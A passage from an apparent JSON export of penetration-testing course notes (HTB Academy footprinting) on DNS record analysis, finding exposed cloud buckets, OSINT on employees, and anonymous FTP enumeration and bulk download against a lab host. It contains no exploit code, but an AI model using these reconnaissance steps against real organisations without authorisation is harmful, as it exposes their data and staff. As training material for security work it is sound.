ns2.inwx.net.\ninlanefreight.com.      21600   IN      NS      ns3.inwx.eu.\ninlanefreight.com.      3600    IN      TXT     \"MS=ms92346782372\"\ninlanefreight.com.      21600   IN      TXT     \"atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN\"\ninlanefreight.com.      3600    IN      TXT     \"google-site-verification=O7zV5-xFh_jn7JQ31\"\ninlanefreight.com.      300     IN      TXT     \"google-site-verification=bow47-er9LdgoUeah\"\ninlanefreight.com.      3600    IN      TXT     \"google-site-verification=gZsCG-BINLopf4hr2\"\ninlanefreight.com.      3600    IN      TXT     \"logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc\"\ninlanefreight.com.      300     IN      TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all\"\ninlanefreight.com.      21600   IN      SOA     ns.inwx.net. hostmaster.inwx.net. 2021072600 10800 3600 604800 3600\n\n;; Query time: 332 msec\n;; SERVER: 127.0.0.53#53(127.0.0.53)\n;; WHEN: Mi Sep 01 18:27:22 CEST 2021\n;; MSG SIZE  rcvd: 940\n```\n\nLet us look at what we have learned here and come back to our principles. We see an IP record, some mail servers, some DNS servers, TXT records, and an SOA record.\n\n- `A` records: We recognize the IP addresses that point to a specific (sub)domain through the A record. Here we only see one that we already know.\n    \n- `MX` records: The mail server records show us which mail server is responsible for managing the emails for the company. Since this is handled by google in our case, we should note this and skip it for now.\n    \n- `NS` records: These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider.\n    \n- `TXT` records: this type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the emails sent. Here we can already see some valuable information if we look closer at the results.\n    \n\nDomain Information\n\n```shell-session\n...SNIP... TXT     \"MS=ms92346782372\"\n...SNIP... TXT     \"atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN\"\n...SNIP... TXT     \"google-site-verification=O7zV5-xFh_jn7JQ31\"\n...SNIP... TXT     \"google-site-verification=bow47-er9LdgoUeah\"\n...SNIP... TXT     \"google-site-verification=gZsCG-BINLopf4hr2\"\n...SNIP... TXT     \"logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc\"\n...SNIP... TXT     \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all\"\n```\n\nWhat we could see so far were entries on the DNS server, which at first glance did not look very interesting (except for the additional IP addresses). However, we could not see the third-party providers behind the entries shown at first glance. The core information we can see now is:\n\n||||\n|---|---|---|\n|[Atlassian](https://www.atlassian.com/)|[Google Gmail](https://www.google.com/gmail/)|[LogMeIn](https://www.logmein.com/)|\n|[Mailgun](https://www.mailgun.com/)|[Outlook](https://outlook.live.com/owa/)|[INWX](https://www.inwx.com/en) ID/Username|\n|10.129.24.8|10.129.27.2|10.72.82.106|\n\nFor example, [Atlassian](https://www.atlassian.com/) states that the company uses this solution for software development and collaboration. If we are not familiar with this platform, we can try it for free to get acquainted with it.\n\n[Google Gmail](https://www.google.com/gmail/) indicates that Google is used for email management. Therefore, it can also suggest that we could access open GDrive folders or files with a link.\n\n[LogMeIn](https://www.logmein.com/) is a central place that regulates and manages remote access on many different levels. However, the centralization of such operations is a double-edged sword. If access as an administrator to this platform is obtained (e.g., through password reuse), one also has complete access to all systems and information.\n\n[Mailgun](https://www.mailgun.com/) offers several email APIs, SMTP relays, and webhooks with which emails can be managed. This tells us to keep our eyes open for API interfaces that we can then test for various vulnerabilities such as IDOR, SSRF, POST, PUT requests, and many other attacks.\n\n[Outlook](https://outlook.live.com/owa/) is another indicator for document management. Companies often use Office 365 with OneDrive and cloud resources such as Azure blob and file storage. Azure file storage can be very interesting because it works with the SMB protocol.\n\nThe last thing we see is [INWX](https://www.inwx.com/en). This company seems to be a hosting provider where domains can be purchased and registered. The TXT record with the \"MS\" value is often used to confirm the domain. In most cases, it is similar to the username or ID used to log in to the management platform.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/05-Cloud Resources",
    "path": "02_CPTS/03-Footprinting/05-Cloud Resources.md",
    "title": "05 Cloud Resources",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The use of cloud, such as AWS, GCP, Azure, and others, is now one of the essential components for many companies nowadays. After all, all companies want to be able to do their work from anywhere, so t...",
    "category": "02_CPTS",
    "content": "The use of cloud, such as [AWS](https://aws.amazon.com/), [GCP](https://cloud.google.com/), [Azure](https://azure.microsoft.com/en-us/), and others, is now one of the essential components for many companies nowadays. After all, all companies want to be able to do their work from anywhere, so they need a central point for all management. This is why services from `Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) are ideal for this purpose.\n\nEven though cloud providers secure their infrastructure centrally, this does not mean that companies are free from vulnerabilities. The configurations made by the administrators may nevertheless make the company's cloud resources vulnerable. This often starts with the `S3 buckets` (AWS), `blobs` (Azure), `cloud storage` (GCP), which can be accessed without authentication if configured incorrectly.\n\n#### Company Hosted Servers\n\nCloud Resources\n\n```shell-session\ndrxh3kr@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done\n\nblog.inlanefreight.com 10.129.24.93\ninlanefreight.com 10.129.27.33\nmatomo.inlanefreight.com 10.129.127.22\nwww.inlanefreight.com 10.129.127.33\ns3-website-us-west-2.amazonaws.com 10.129.95.250\n```\n\nOften cloud storage is added to the DNS list when used for administrative purposes by other employees. This step makes it much easier for the employees to reach and manage them. Let us stay with the case that a company has contracted us, and during the IP lookup, we have already seen that one IP address belongs to the `s3-website-us-west-2.amazonaws.com` server.\n\nHowever, there are many different ways to find such cloud storage. One of the easiest and most used is Google search combined with Google Dorks. For example, we can use the Google Dorks `inurl:` and `intext:` to narrow our search to specific terms. In the following example, we see red censored areas containing the company name.\n\n#### Google Search for AWS\n\n![Google search results for 'intext: [redacted] inurl:amazonaws.com' showing links to Amazon S3 PDFs.](https://academy.hackthebox.com/storage/modules/112/gsearch1.png)\n\n#### Google Search for Azure\n\n![Google search results for 'intext: [redacted] inurl:blob.core.windows.net' showing links to PDF files on Azure Blob Storage.](https://academy.hackthebox.com/storage/modules/112/gsearch2.png)\n\nHere we can already see that the links presented by Google contain PDFs. When we search for a company that we may already know or want to know, we will also come across other files such as text documents, presentations, codes, and many others.\n\nSuch content is also often included in the source code of the web pages, from where the images, JavaScript codes, or CSS are loaded. This procedure often relieves the web server and does not store unnecessary content.\n\n#### Target Website - Source Code\n\n![HTML code snippet showing DNS prefetch and preconnect links to [redacted] blob.core.windows.net with crossorigin attributes.](https://academy.hackthebox.com/storage/modules/112/cloud3.png)\n\nThird-party providers such as [domain.glass](https://domain.glass) can also tell us a lot about the company's infrastructure. As a positive side effect, we can also see that Cloudflare's security assessment status has been classified as \"Safe\". This means we have already found a security measure that can be noted for the second layer (gateway).\n\n#### Domain.Glass Results\n\n![Domain status page showing Cloudflare security assessment as safe for [redacted]. Includes social media links, external tools, IP information, and SSL certificate details with issuer and DNS names.](https://academy.hackthebox.com/storage/modules/112/cloud1.png)\n\nAnother very useful provider is [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud storage, and even sort and filter by file format. Therefore, once we have found them through Google, we can also search for them on GrayHatWarefare and passively discover what files are stored on the given cloud storage.\n\n#### GrayHatWarfare Results\n\n![Dashboard showing filter options and a list of three AWS S3 buckets with file counts: 1, 73, and 0.](https://academy.hackthebox.com/storage/modules/112/cloud2.png)\n\nMany companies also use abbreviations of the company name, which are then used accordingly within the IT infrastructure. Such terms are also part of an excellent approach to discovering new cloud storage from the company. We can also search for files simultaneously to see the files that can be accessed at the same time.\n\n#### Private and Public SSH Keys Leaked\n\n![Dashboard showing AWS S3 file listings with two entries: 'id_rsa' and 'id_rsa.pub' from [redacted] bucket, dated August 2021.](https://academy.hackthebox.com/storage/modules/112/ghw1.png)\n\nSometimes when employees are overworked or under high pressure, mistakes can be fatal for the entire company. These errors can even lead to SSH private keys being leaked, which anyone can download and log onto one or even more machines in the company without using a password.\n\n#### SSH Private Key\n\n![Image of an RSA private key block, starting with 'BEGIN RSA PRIVATE KEY' and ending with 'END RSA PRIVATE KEY'.](https://academy.hackthebox.com/storage/modules/112/ghw2.png)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/06-Staff",
    "path": "02_CPTS/03-Footprinting/06-Staff.md",
    "title": "06 Staff",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Searching for and identifying employees on social media platforms can also reveal a lot about the teams' infrastructure and makeup. This, in turn, can lead to us identifying which technologies, progra...",
    "category": "02_CPTS",
    "content": "Searching for and identifying employees on social media platforms can also reveal a lot about the teams' infrastructure and makeup. This, in turn, can lead to us identifying which technologies, programming languages, and even software applications are being used. To a large extent, we will also be able to assess each person's focus based on their skills. The posts and material shared with others are also a great indicator of what the person is currently engaged in and what that person currently feels is important to share with others.\n\nEmployees can be identified on various business networks such as [LinkedIn](https://www.linkedin.com) or [Xing](https://www.xing.de). Job postings from companies can also tell us a lot about their infrastructure and give us clues about what we should be looking for.\n\n#### LinkedIn - Job Post\n\nCode: txt\n\n```txt\nRequired Skills/Knowledge/Experience:\n\n* 3-10+ years of experience on professional software development projects.\n\n« An active US Government TS/SCI Security Clearance (current SSBI) or eligibility to obtain TS/SCI within nine months.\n« Bachelor's degree in computer science/computer engineering with an engineering/math focus or another equivalent field of discipline.\n« Experience with one or more object-oriented languages (e.g., Java, C#, C++).\n« Experience with one or more scripting languages (e.g., Python, Ruby, PHP, Perl).\n« Experience using SQL databases (e.g., PostgreSQL, MySQL, SQL Server, Oracle).\n« Experience using ORM frameworks (e.g., SQLAIchemy, Hibernate, Entity Framework).\n« Experience using Web frameworks (e.g., Flask, Django, Spring, ASP.NET MVC).\n« Proficient with unit testing and test frameworks (e.g., pytest, JUnit, NUnit, xUnit).\n« Service-Oriented Architecture (SOA)/microservices & RESTful API design/implementation.\n« Familiar and comfortable with Agile Development Processes.\n« Familiar and comfortable with Continuous Integration environments.\n« Experience with version control systems (e.g., Git, SVN, Mercurial, Perforce).\n\nDesired Skills/Knowledge/ Experience:\n\n« CompTIA Security+ certification (or equivalent).\n« Experience with Atlassian suite (Confluence, Jira, Bitbucket).\n« Algorithm Development (e.g., Image Processing algorithms).\n« Software security.\n« Containerization and container orchestration (Docker, Kubernetes, etc.)\n« Redis.\n« NumPy.\n```\n\nFrom a job post like this, we can see, for example, which programming languages are preferred: `Java, C#, C++, Python, Ruby, PHP, Perl`. It also required that the applicant be familiar with different databases, such as: `PostgreSQL, Mysql, and Oracle`. In addition, we know that different frameworks are used for web application development, such as: `Flask, Django, ASP.NET, Spring`.\n\nFurthermore, we use `REST APIs, Github, SVN, and Perforce`. The job offer also results that the company works with Atlassian Suite, and therefore there may be resources that we could potentially access. We can see some skills and projects from the career history that give us a reasonable estimate of the employee's knowledge.\n\n#### LinkedIn - Employee #1 About\n\n![Profile section mentioning W3C specs, web components, React, Svelte, AngularJS, and a GitHub link to open source projects.](https://academy.hackthebox.com/storage/modules/112/linkedin-pers2.png)\n\nWe try to make business contacts on social media sites and prove to visitors what skills we bring to the table, which inevitably leads to us sharing with the public what we know and what we have learned so far. Companies always hire employees whose skills they can use and apply to the business. For example, we know that Flask and Django are web frameworks for the Python programming language.\n\nIf we do a little search for Django security misconfigurations, we will eventually come across the following [Github repository](https://github.com/boomcamp/django-security) that describes OWASP Top10 for Django. We can use this to understand the inner structure of Django and how it works. The best practices also often tell us what to look for. Because many blindly trust them and even name many of the files as shown in the instructions.\n\n#### Github\n\n![Code snippet showing JSON with fields for name, author, email, and a GitHub URL.](https://academy.hackthebox.com/storage/modules/112/github.png)\n\n![Code snippet defining a function to decode a JWT with a payload, secret, and redacted JWT string.](https://academy.hackthebox.com/storage/modules/112/github2.png)\n\nShowing our projects can, of course, be of great advantage to make new business contacts and possibly even get a new job, but on the other hand, it can lead to mistakes that will be very difficult to fix. For example, in one of the files, we can discover the employee's personal email address, and upon deeper investigation, the web application has a hardcoded [JWT token](https://jwt.io/).\n\n#### LinkedIn - Employee #2 Career\n\n![Profile showing roles: Vice President Software Engineer and Associate Software Engineer. Responsibilities include leading CRM mobile app development and delivering the BrokerVotes system. Skills listed: Java, React, Slang, Elastic, Kafka.](https://academy.hackthebox.com/storage/modules/112/linkedin-pers1.png)\n\n[LinkedIn](https://www.linkedin.com) offers a comprehensive search for employed, sorted by connections, locations, companies, school, industry, profile language, services, names, titles, and more. Understandably, the more detailed information we provide there, the fewer results we get. Therefore, we should think carefully about the purpose of performing the search.\n\nSuppose we are trying to find the infrastructure and technology the company is most likely to use. We should look for technical employees who work both in development and security. Because based on the security area and the employees who work in that area, we will also be able to determine what security measures the company has put in place to secure itself.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/07-FTP",
    "path": "02_CPTS/03-Footprinting/07-FTP.md",
    "title": "07 FTP",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The File Transfer Protocol (FTP) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as HTTP or POP. T...",
    "category": "02_CPTS",
    "content": "The `File Transfer Protocol` (`FTP`) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as `HTTP` or `POP`. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.\n\nLet us imagine that we want to upload local files to a server and download other files using the [FTP](https://datatracker.ietf.org/doc/html/rfc959) protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through `TCP port 21`. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via `TCP port 20`. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.\n\nA distinction is made between `active` and `passive` FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.\n\nThe FTP knows different [commands](https://web.archive.org/web/20230326204635/https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/) and status codes. Not all of these commands are consistently implemented on the server. For example, the client-side instructs the server-side to upload or download files, organize directories or delete files. The server responds in each case with a status code that indicates whether the command was successfully implemented. A list of possible status codes can be found [here](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes).\n\nUsually, we need credentials to use FTP on a server. We also need to know that FTP is a `clear-text` protocol that can sometimes be sniffed if conditions on the network are right. However, there is also the possibility that a server offers `anonymous FTP`. The server operator then allows any user to upload or download files via FTP without using a password. Since there are security risks associated with such a public FTP server, the options for users are usually limited.\n\n---\n\n## TFTP\n\n`Trivial File Transfer Protocol` (`TFTP`) is simpler than FTP and performs file transfers between client and server processes. However, it `does not` provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses `UDP`, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.\n\nThis is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user's authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.\n\nLet us take a look at a few commands of `TFTP`:\n\n|**Commands**|**Description**|\n|---|---|\n|`connect`|Sets the remote host, and optionally the port, for file transfers.|\n|`get`|Transfers a file or set of files from the remote host to the local host.|\n|`put`|Transfers a file or set of files from the local host onto the remote host.|\n|`quit`|Exits tftp.|\n|`status`|Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.|\n|`verbose`|Turns verbose mode, which displays additional information during file transfer, on or off.|\n\nUnlike the FTP client, `TFTP` does not have directory listing functionality.\n\n---\n\n## Default Configuration\n\nOne of the most used FTP servers on Linux-based distributions is [vsFTPd](https://security.appspot.com/vsftpd.html). The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`, and some settings are already predefined by default. It is highly recommended to install the vsFTPd server on a VM and have a closer look at this configuration.\n\n#### Install vsFTPd\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt install vsftpd \n```\n\nThe vsFTPd server is only one of a few FTP servers available to us. There are many different alternatives to it, which also bring, among other things, many more functions and configuration options with them. We will use the vsFTPd server because it is an excellent way to show the configuration possibilities of an FTP server in a simple and easy-to-understand way without going into the details of the man pages. If we look at the configuration file of vsFTPd, we will see many options and settings that are either commented or commented out. However, the configuration file does not contain all possible settings that can be made. The existing and missing ones can be found on the [man page](http://vsftpd.beasts.org/vsftpd_conf.html).\n\n#### vsFTPd Config File\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/vsftpd.conf | grep -v \"#\"\n```\n\n|**Setting**|**Description**|\n|---|---|\n|`listen=NO`|Run from inetd or as a standalone daemon?|\n|`listen_ipv6=YES`|Listen on IPv6 ?|\n|`anonymous_enable=NO`|Enable Anonymous access?|\n|`local_enable=YES`|Allow local users to login?|\n|`dirmessage_enable=YES`|Display active directory messages when users go into certain directories?|\n|`use_localtime=YES`|Use local time?|\n|`xferlog_enable=YES`|Activate logging of uploads/downloads?|\n|`connect_from_port_20=YES`|Connect from port 20?|\n|`secure_chroot_dir=/var/run/vsftpd/empty`|Name of an empty directory|\n|`pam_service_name=vsftpd`|This string is the name of the PAM service vsftpd will use.|\n|`rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem`|The last three options specify the location of the RSA certificate to use for SSL encrypted connections.|\n|`rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key`||\n|`ssl_enable=NO`||\n\nIn addition, there is a file called `/etc/ftpusers` that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. In the following example, the users `guest`, `john`, and `kevin` are not permitted to log in to the FTP service, even if they exist on the Linux system.\n\n#### FTPUSERS\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/ftpusers\n\nguest\njohn\nkevin\n```\n\n---\n\n## Dangerous Settings\n\nThere are many different security-related settings we can make on each FTP server. These can have various purposes, such as testing connections through the firewalls, testing routes, and authentication mechanisms. One of these authentication mechanisms is the `anonymous` user. This is often used to allow everyone on the internal network to share files and data without accessing each other's computers. With vsFTPd, the [optional settings](http://vsftpd.beasts.org/vsftpd_conf.html) that can be added to the configuration file for the anonymous login look like this:\n\n|**Setting**|**Description**|\n|---|---|\n|`anonymous_enable=YES`|Allowing anonymous login?|\n|`anon_upload_enable=YES`|Allowing anonymous to upload files?|\n|`anon_mkdir_write_enable=YES`|Allowing anonymous to create new directories?|\n|`no_anon_password=YES`|Do not ask anonymous for password?|\n|`anon_root=/home/username/ftp`|Directory for anonymous.|\n|`write_enable=YES`|Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?|\n\nWith the standard FTP client (`ftp`), we can access the FTP server accordingly and log in with the anonymous user if the settings shown above have been used. The use of the anonymous account can occur in internal environments and infrastructures where the participants are all known. Access to this type of service can be set temporarily or with the setting to accelerate the exchange of files.\n\nAs soon as we connect to the vsFTPd server, the `response code 220` is displayed with the banner of the FTP server. Often this banner contains the description of the `service` and even the `version` of it. It also tells us what type of system the FTP server is. One of the most common configurations of FTP servers is to allow `anonymous` access, which does not require legitimate credentials but provides access to some files. Even if we cannot download them, sometimes just listing the contents is enough to generate further ideas and note down information that will help us in another approach.\n\n#### Anonymous Login\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ ftp 10.129.14.136\n\nConnected to 10.129.14.136.\n220 \"Welcome to the HTB Academy vsFTP service.\"\nName (10.129.14.136:cry0l1t3): anonymous\n\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n\n\nftp> ls\n\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt\n226 Directory send OK.\n\n```\n\nHowever, to get the first overview of the server's settings, we can use the following command:\n\n#### vsFTPd Status\n\nFTP\n\n```shell-session\nftp> status\n\nConnected to 10.129.14.136.\nNo proxy connection.\nConnecting using address family: any.\nMode: stream; Type: binary; Form: non-print; Structure: file\nVerbose: on; Bell: off; Prompting: on; Globbing: on\nStore unique: off; Receive unique: off\nCase: off; CR stripping: on\nQuote control characters: on\nNtrans: off\nNmap: off\nHash mark printing: off; Use of PORT cmds: on\nTick counter printing: off\n```\n\nSome commands should be used occasionally, as these will make the server show us more information that we can use for our purposes. These commands include `debug` and `trace`.\n\n#### vsFTPd Detailed Output\n\nFTP\n\n```shell-session\nftp> debug\n\nDebugging on (debug=1).\n\n\nftp> trace\n\nPacket tracing on.\n\n\nftp> ls\n\n---> PORT 10,10,14,4,188,195\n200 PORT command successful. Consider using PASV.\n---> LIST\n150 Here comes the directory listing.\n-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt\n226 Directory send OK.\n```\n\n|**Setting**|**Description**|\n|---|---|\n|`dirmessage_enable=YES`|Show a message when they first enter a new directory?|\n|`chown_uploads=YES`|Change ownership of anonymously uploaded files?|\n|`chown_username=username`|User who is given ownership of anonymously uploaded files.|\n|`local_enable=YES`|Enable local users to login?|\n|`chroot_local_user=YES`|Place local users into their home directory?|\n|`chroot_list_enable=YES`|Use a list of local users that will be placed in their home directory?|\n\n|**Setting**|**Description**|\n|---|---|\n|`hide_ids=YES`|All user and group information in directory listings will be displayed as \"ftp\".|\n|`ls_recurse_enable=YES`|Allows the use of recurse listings.|\n\nIn the following example, we can see that if the `hide_ids=YES` setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded.\n\n#### Hiding IDs - YES\n\nFTP\n\n```shell-session\nftp> ls\n\n---> TYPE A\n200 Switching to ASCII mode.\nftp: setsockopt (ignored): Permission denied\n---> PORT 10,10,14,4,223,101\n200 PORT command successful. Consider using PASV.\n---> LIST\n150 Here comes the directory listing.\n-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt\n-rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt\n226 Directory send OK.\n```\n\nThis setting is a security feature to prevent local usernames from being revealed. With the usernames, we could attack the services like FTP and SSH and many others with a brute-force attack in theory. However, in reality, [fail2ban](https://en.wikipedia.org/wiki/Fail2ban) solutions are now a standard implementation of any infrastructure that logs the IP address and blocks all access to the infrastructure after a certain number of failed login attempts.\n\nAnother helpful setting we can use for our purposes is the `ls_recurse_enable=YES`. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.\n\n#### Recursive Listing\n\nFTP\n\n```shell-session\nftp> ls -R\n\n---> PORT 10,10,14,4,222,149\n200 PORT command successful. Consider using PASV.\n---> LIST -R\n150 Here comes the directory listing.\n.:\n-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt\n-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt\n\n./Clients:\ndrwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox\ndrwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight\n\n./Clients/HackTheBox:\n-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx\n-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx\n-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf\n-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt\n\n./Clients/Inlanefreight:\n-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx\n-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx\n-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt\n-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx\n\n./Documents:\n-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx\n-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx\n-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf\n\n./Employees:\n226 Directory send OK.\n\n```\n\n`Downloading` files from such an FTP server is one of the main features, as well as `uploading` files created by us. This allows us, for example, to use LFI vulnerabilities to make the host execute system commands. Apart from the files, we can view, download and inspect. Attacks are also possible with the FTP logs, leading to `Remote Command Execution` (`RCE`). This applies to the FTP services and all those we can detect during our enumeration phase.\n\n#### Download a File\n\nFTP\n\n```shell-session\nftp> ls\n\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rwxrwxrwx    1 ftp      ftp             0 Sep 16 17:24 Calendar.pptx\ndrwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients\ndrwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents\ndrwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees\n-rwxrwxrwx    1 ftp      ftp            41 Sep 18 15:58 Important Notes.txt\n226 Directory send OK.\n\n\nftp> get Important\\ Notes.txt\n\nlocal: Important Notes.txt remote: Important Notes.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).\n226 Transfer complete.\n41 bytes received in 0.00 secs (606.6525 kB/s)\n\n\nftp> exit\n\n221 Goodbye.\n```\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls | grep Notes.txt\n\n'Important Notes.txt'\n```\n\nWe also can download all the files and folders we have access to at once. This is especially useful if the FTP server has many different files in a larger folder structure. However, this can cause alarms because no one from the company usually wants to download all files and content all at once.\n\n#### Download All Available Files\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136\n\n--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         \n           => ‘10.129.14.136/.listing’                                                                     \nConnecting to 10.129.14.136:21... connected.                                                               \nLogging in as anonymous ... Logged in!\n==> SYST ... done.    ==> PWD ... done.\n==> TYPE I ... done.  ==> CWD not needed.\n==> PORT ... done.    ==> LIST ... done.                                                                 \n12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s       \n                                                                                                         \n2021-09-19 14:45:58 (65,8 MB/s) - ‘10.129.14.136/.listing’ saved [466]                                     \n--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   \n           => ‘10.129.14.136/Calendar.pptx’                                       \n==> CWD not required.                                                           \n==> SIZE Calendar.pptx ... done.                                                                                                                            \n==> PORT ... done.    ==> RETR Calendar.pptx ... done.       \n\n...SNIP...\n\n2021-09-19 14:45:58 (48,3 MB/s) - ‘10.129.14.136/Employees/.listing’ saved [119]\n\nFINISHED --2021-09-19 14:45:58--\nTotal wall clock time: 0,03s\nDownloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)\n```\n\nOnce we have downloaded all the files, `wget` will create a directory with the name of the IP address of our target. All downloaded files are stored there, which we can then inspect locally.\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ tree .\n\n.\n└── 10.129.14.136\n    ├── Calendar.pptx\n    ├── Clients\n    │   └── Inlanefreight\n    │       ├── appointments.xlsx\n    │       ├── contract.docx\n    │       ├── meetings.txt\n    │       └── proposal.pptx\n    ├── Documents\n    │   ├── appointments-template.xlsx\n    │   ├── contract-template.docx\n    │   └── contract-template.pdf\n    ├── Employees\n    └── Important Notes.txt\n\n5 directories, 9 files\n```\n\nNext, we can check if we have the permissions to upload files to the FTP server. Especially with web servers, it is common that files are synchronized, and the developers have quick access to the files. FTP is often used for this purpose, and most of the time, configuration errors are found on servers that the administrators think are not discoverable. The attitude that internal network components cannot be accessed from the outside means that the hardening of internal systems is often neglected and leads to misconfigurations.\n\nThe ability to upload files to the FTP server connected to a web server increases the likelihood of gaining direct access to the webserver 